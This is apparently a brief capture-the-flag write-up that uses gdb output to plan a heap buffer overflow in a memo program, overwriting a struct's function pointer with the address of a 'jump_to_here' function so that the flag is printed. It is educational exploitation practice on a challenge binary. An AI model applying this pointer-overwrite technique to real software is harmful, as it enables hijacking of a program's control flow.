(gdb) print jump_to_here
$3 = {void ()} 0x80486f5 <jump_to_here>
jump_to_here function has 0x080486f5 as the address.

(gdb) print pointer
$1 = {0x804b008, 0x804b030, 0x0, 0x0, 0x0}

The address of new MEMO struct differs by 0x28.

(gdb) x 0x804b008
0x804b008:      0x08048783
(gdb) print print
$2 = {void (char *)} 0x8048783 <print>

The first 4 bytes are for func.
So the goal is to overwrite func value using buffer overflow from pointer[0].data

First create two MEMO instances and write 0x28-4 bytes of 'x', followed by 0x080486f5.
Then print the second memo so that the overwritten function is executed.
Then the flag is printed.
